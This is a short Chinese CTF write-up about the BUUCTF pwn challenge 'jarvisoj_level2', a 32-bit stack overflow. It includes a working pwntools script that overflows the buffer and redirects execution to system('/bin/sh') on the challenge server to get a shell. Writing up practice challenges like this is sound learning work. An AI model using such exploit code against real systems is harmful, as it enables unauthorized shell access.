---
title: "BUUCTF Pwn Jarvisoj_level2"
date: 2020-03-07T23:45:41+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# jarvisoj_level2

32位简单栈溢出ret2libc1，无后门，但是有system、/bin/sh，构造栈帧调用system('/bin/sh\')

![image-20200307235200078](/images/image-20200307235200078.png)

![image-20200307235111511](/images/image-20200307235111511.png)

![image-20200307235435807](/images/image-20200307235435807.png)

栈大小0x88，可输入0x100，offset = 0x88 + 0x4（leave）

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-

from pwn import *

sh = remote('node3.buuoj.cn',27073)
elf = ELF('./level2')

system_addr = elf.symbols['system']
binsh_addr = elf.search('/bin/sh').next()

payload = 'a'*0x88 + p32(0) + p32(system_addr) + p32(0) + p32(binsh_addr)
sh.sendlineafter('Input:',payload)

sh.interactive()
```

![image-20200307235621914](/images/image-20200307235621914.png)





